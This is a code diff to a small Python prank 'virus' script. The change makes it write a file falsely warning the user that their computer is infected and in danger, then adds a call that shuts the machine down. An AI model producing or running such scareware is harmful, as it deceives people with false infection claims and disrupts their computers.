@@ -42,15 +42,8 @@ def menu():
             return option
 
 
-def create_file(user_platform):
-    USER_PATH_WINDOWS = 'C:\\Users\\' + get_user() + '\\Desktop\\' + get_user() + '.txt'
-    USER_PATH_LINUX = '/home/' + get_user() + '/Escritorio/' + get_user() + '.txt'
-    user_desktop = None
-    if user_platform == 'Windows':
-        user_desktop = USER_PATH_WINDOWS
-    elif user_platform == 'Linux':
-        user_desktop = USER_PATH_LINUX
-    with open(user_desktop, 'w') as file:
+def create_file():
+    with open('Hola, tu computadora infectada.txt', 'w') as file:
         file.write('Hello, ' + get_user() + '!\n')
         file.write('Your computer is in danger\n')
         file.write('Please contact your administrator immediately!\n')
@@ -145,7 +138,8 @@ def ultimateSuperDangerVirus():
 def main():
     ultimateSuperDangerVirus()
     options(menu())
-    create_file(check_platform())
+    create_file()
+    shutdown(check_platform())
 
 
 if __name__ == "__main__":
